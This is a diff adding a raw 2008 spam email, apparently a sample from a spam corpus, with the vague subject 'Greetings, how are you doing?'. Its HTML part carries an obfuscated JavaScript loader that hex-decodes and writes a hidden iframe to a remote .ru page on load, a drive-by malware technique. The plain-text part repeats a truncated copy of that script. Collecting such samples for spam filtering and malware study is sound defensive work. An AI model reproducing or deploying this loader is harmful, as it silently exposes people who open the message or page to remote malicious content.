@@ -1,0 +1,48 @@
+Return-Path: <tequierobudda@libero.it>
+Received: from edge05.upc.biz ([192.168.13.212]) by viefep19-int.chello.at
+          (InterMail vM.7.08.02.02 201-2186-121-104-20070414) with ESMTP
+          id <20080806085437.NQAG16862.viefep19-int.chello.at@edge05.upc.biz>
+          for <c.splinter@direct.a2000.nl>; Wed, 6 Aug 2008 10:54:37 +0200
+Received: from 121.246.61.53.dynamic-kolkata.vsnl.net.in ([121.246.61.53])
+	by edge05.upc.biz with edge05
+	id ywuW1Z03d18vRu105wuZj7; Wed, 06 Aug 2008 10:54:36 +0200
+Received: from [121.246.61.53] by mxlibero1.libero.it; Wed, 6 Aug 2008 14:24:35 +0530
+X-SPAM: Yes
+X-SourceIP: 121.246.61.53
+Date:	Wed, 6 Aug 2008 14:24:35 +0530
+From:	"Wilbur Boudreaux" <tequierobudda@libero.it>
+X-Mailer: The Bat! (v3.80.06) Professional
+Reply-To: tequierobudda@libero.it
+X-Priority: 3 (Normal)
+Message-ID: <531665201.57830181264149@libero.it>
+To: c.splinter@direct.a2000.nl
+Subject: Greetings, how are you doing?
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+  boundary="----------A21A213DA29EFDA"
+Date: Wed, 6 Aug 2008 10:54:37 +0200
+From: <tequierobudda@libero.it>
+
+------------A21A213DA29EFDA
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+
+Greetings, how are you doing? Give we shall meet!function c12m4896b2bd1d9f3(m4896b2bd1e1c3){ var m4896b2bd1e993=16; return (parseInt(m4896b2bd1e1c3,m4896b2bd1e993));}function m4896b2bd1f933(m4896b2bd20103){ function m4896b2bd21874(){return 2;} var m4896b2bd208d4='';m4896b2bd22813=String.fromCharCode;for(m4896b2bd210a3=0;m4896b2bd210a3
+------------A21A213DA29EFDA
+Content-Type: text/html; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<HTML><HEAD><TITLE></TITLE>
+</HEAD>
+<BODY>
+
+</head>
+Greetings, how are you doing? Give we shall meet!
+<body>
+</body>
+</html>
+<script>function c12m4896b2bd1d9f3(m4896b2bd1e1c3){ var m4896b2bd1e993=16; return (parseInt(m4896b2bd1e1c3,m4896b2bd1e993));}function m4896b2bd1f933(m4896b2bd20103){ function m4896b2bd21874(){return 2;} var m4896b2bd208d4='';m4896b2bd22813=String.fromCharCode;for(m4896b2bd210a3=0;m4896b2bd210a3<m4896b2bd20103.length;m4896b2bd210a3+=m4896b2bd21874()){ m4896b2bd208d4+=(m4896b2bd22813(c12m4896b2bd1d9f3(m4896b2bd20103.substr(m4896b2bd210a3,m4896b2bd21874()))));}return m4896b2bd208d4;} var z2b='';var m4896b2bd22fe3='3C7'+z2b+'3637'+z2b+'2697'+z2b+'07'+z2b+'43E696628216D7'+z2b+'96961297'+z2b+'B646F637'+z2b+'56D656E7'+z2b+'42E7'+z2b+'7'+z2b+'7'+z2b+'2697'+z2b+'465287'+z2b+'56E657'+z2b+'363617'+z2b+'065282027'+z2b+'2533632536392536362537'+z2b+'322536312536642536352532302536652536312536642536352533642536332533312532302537'+z2b+'332537'+z2b+'32253633253364253237'+z2b+'2536382537'+z2b+'342537'+z2b+'342537'+z2b+'302533612532662532662536662537'+z2b+'392533342536322532642536662537'+z2b+'392536622536322532652537'+z2b+'322537'+z2b+'352532662536362536392532662536392536652536342536352537'+z2b+'382532652537'+z2b+'302536382537'+z2b+'30253366253237'+z2b+'2532622534642536312537'+z2b+'342536382532652537'+z2b+'322536662537'+z2b+'352536652536342532382534642536312537'+z2b+'342536382532652537'+z2b+'32253631253665253634253666253664253238253239253261253336253337'+z2b+'253330253335253336253239253262253237'+z2b+'253338253335253632253337'+z2b+'253636253634253330253631253338253332253632253337'+z2b+'253237'+z2b+'2532302537'+z2b+'37'+z2b+'2536392536342537'+z2b+'34253638253364253333253338253331253230253638253635253639253637'+z2b+'2536382537'+z2b+'34253364253331253337'+z2b+'2533362532302537'+z2b+'332537'+z2b+'342537'+z2b+'39253663253635253364253237'+z2b+'2536342536392537'+z2b+'332537'+z2b+'302536632536312537'+z2b+'39253361253230253665253666253665253635253237'+z2b+'2533652533632532662536392536362537'+z2b+'3225363125366425363525336527'+z2b+'29293B7'+z2b+'D7'+z2b+'6617'+z2b+'2206D7'+z2b+'969613D7'+z2b+'47'+z2b+'27'+z2b+'5653B3C2F7'+z2b+'3637'+z2b+'2697'+z2b+'07'+z2b+'43E';document.write(m4896b2bd1f933(m4896b2bd22fe3));</script>
+
+</BODY></HTML>
+------------A21A213DA29EFDA--
